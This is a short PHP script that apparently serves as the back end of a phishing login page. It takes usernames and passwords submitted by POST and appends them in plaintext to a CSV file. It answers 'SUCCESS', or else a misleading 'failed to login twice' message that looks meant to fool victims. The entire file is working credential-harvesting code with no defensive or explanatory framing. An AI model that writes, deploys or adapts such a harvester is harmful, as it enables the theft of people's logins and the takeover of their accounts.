<?php
$myfile = fopen("symdis.csv", "a") or die("Unable to open file!");
if (isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST["username"];
    $password = $_POST["password"];
    $txt = $username.",". $password."\n";
    fwrite($myfile, $txt);
    fclose($myfile);
    echo "SUCCESS";
} else {
echo "failed to login twice";
}
?>